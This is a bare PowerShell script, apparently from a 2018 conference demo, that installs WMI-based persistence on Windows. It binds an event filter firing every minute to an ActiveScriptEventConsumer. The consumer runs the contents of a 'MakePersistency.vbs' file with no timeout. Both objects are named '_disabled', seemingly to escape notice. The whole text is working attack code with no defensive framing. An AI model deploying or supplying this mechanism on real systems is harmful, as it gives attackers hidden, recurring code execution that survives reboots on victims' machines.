#script text
$content = [IO.File]::ReadAllText("E:\ignite2018\MakePersistency.vbs")

# create Event Filter
$EventFilter = ([WMICLASS]"\\.\root\subscription:__EventFilter").CreateInstance()
$EventFilter.QueryLanguage  = "WQL"
$EventFilter.Query          = "Select * From __InstanceModificationEvent Where TargetInstance Isa 'Win32_LocalTime' And TargetInstance.Second = 10"
$EVentFilter.EventNamespace = "root\cimv2"
$EventFilter.Name           = "_disabled"
$Result = $EventFilter.Put()
$Filter = $Result.Path     # for later

# Create Logical Consumer
$InstanceConsumer = ([wmiclass]"\\.\root\subscription:ActiveScriptEventConsumer").CreateInstance()
$InstanceConsumer.Name = "_disabled"
$InstanceConsumer.KillTimeout = 0
$InstanceConsumer.ScriptingEngine = "VBScript"
$instanceConsumer.ScriptText = $content
$Result = $InstanceConsumer.Put()
$Consumer = $Result.Path   # for later

# Bind event filter to consumer
$InstanceBinding = ([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance()
$InstanceBinding.Filter   = $Filter       # from earlier
$instanceBinding.Consumer = $Consumer     # from earlier
$Result = $InstanceBinding.Put()
